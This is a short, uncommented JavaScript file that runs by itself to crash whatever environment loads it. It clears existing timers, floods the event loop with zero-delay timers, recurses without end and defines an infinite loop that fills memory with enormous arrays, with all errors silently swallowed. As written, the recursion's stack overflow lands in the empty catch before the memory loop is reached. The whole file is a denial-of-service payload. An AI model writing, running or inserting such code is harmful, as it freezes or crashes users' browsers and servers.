async function forceCloseCrash() {
  for (let i = 0; i < 99999; i++) clearInterval(i), clearTimeout(i)
  
  let bomb = []
  for(;;) {
    bomb.push(Array(99999999).fill('💀'))
    bomb.push(new Array(99999999))
    bomb.push({a:1,b:2,c:3,d:4,e:5,f:6,g:7,h:8,i:9,j:10})
  }
}

function rekursifGila() {
  rekursifGila()
}

(async () => {
  try {
    for(let i = 0; i < 100; i++) {
      setTimeout(() => {}, 0)
      setInterval(() => {}, 0)
    }
    rekursifGila()
    await forceCloseCrash()
  } catch(e) {}
})()